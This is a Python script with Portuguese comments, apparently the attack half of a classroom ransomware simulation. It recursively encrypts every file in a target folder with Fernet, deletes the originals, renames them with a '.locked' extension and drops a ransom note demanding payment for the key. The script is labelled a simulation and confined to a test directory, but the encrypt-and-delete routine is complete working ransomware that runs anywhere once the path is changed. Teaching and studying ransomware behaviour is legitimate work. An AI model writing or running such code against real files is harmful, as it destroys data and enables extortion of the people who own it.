from cryptography.fernet import Fernet
import os
import pathlib

# =======================================================================
# CONFIGURAÇÕES DE SEGURANÇA E ALVO
# =======================================================================
DIRETORIO_ALVO = "ransomware_simulado/arquivos_teste"
EXTENSAO_CRIPTOGRAFADA = ".locked"
KEY_FILE = "ransomware_simulado/chave.key" # Chave salva na pasta do ransomware
EXCLUSOES = [KEY_FILE, 'ransomware_ataque.py', 'ransomware_recuperacao.py', 'LEIA ISSO.txt']

def gerar_chave(key_path=KEY_FILE):
    """Gera uma nova chave Fernet e a salva em um arquivo."""
    chave = Fernet.generate_key()
    # Garante que a chave seja salva de forma isolada
    with open(key_path, "wb") as key_file:
        key_file.write(chave)

def carregar_chave(key_path=KEY_FILE):
    """Carrega a chave Fernet a partir do arquivo."""
    return open(key_path, "rb").read()

def criptografar_arquivo(caminho_arquivo, chave):
    """Lê, criptografa e sobrescreve o arquivo, adicionando a extensão .locked."""
    f = Fernet(chave)
    try:
        with open(caminho_arquivo, "rb") as file:
            dados = file.read()
        
        dados_encriptados = f.encrypt(dados)
        
        novo_caminho = str(caminho_arquivo) + EXTENSAO_CRIPTOGRAFADA
        with open(novo_caminho, "wb") as file:
            file.write(dados_encriptados)
            
        os.remove(caminho_arquivo)
        
    except Exception as e:
        print(f"Erro ao criptografar {caminho_arquivo}: {e}")

def encontrar_arquivos(diretorio):
    """Percorre o diretório e retorna caminhos de arquivos válidos para criptografia."""
    lista = []
    for caminho in pathlib.Path(diretorio).rglob('*'):
        if caminho.is_file() and caminho.name not in EXCLUSOES and not caminho.name.endswith(EXTENSAO_CRIPTOGRAFADA):
            lista.append(caminho)
    return lista

def criar_mensagem_resgate(diretorio=DIRETORIO_ALVO):
    """Cria o arquivo de resgate no diretório alvo."""
    caminho_resgate = os.path.join(diretorio, "LEIA ISSO.txt")
    with open(caminho_resgate, "w") as f:
        f.write("Seus arquivos foram CRIPTOGRAFADOS! (Ransomware Simulado)\n\n")
        f.write("Para recuperar seus dados, você precisará da chave única, que só seria liberada após o pagamento.\n")
        f.write("--- FIM DA SIMULAÇÃO DE ATAQUE ---\n")

def main():
    pathlib.Path(DIRETORIO_ALVO).mkdir(parents=True, exist_ok=True)
    
    gerar_chave()
    chave = carregar_chave()
    
    arquivos = encontrar_arquivos(DIRETORIO_ALVO)
    
    if not arquivos:
         print(f"Nenhum arquivo encontrado em '{DIRETORIO_ALVO}'. Crie arquivos de teste.")
         return
         
    print(f"Iniciando criptografia de {len(arquivos)} arquivos...")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados e nota de resgate criada.")

if __name__ == "__main__":
    main()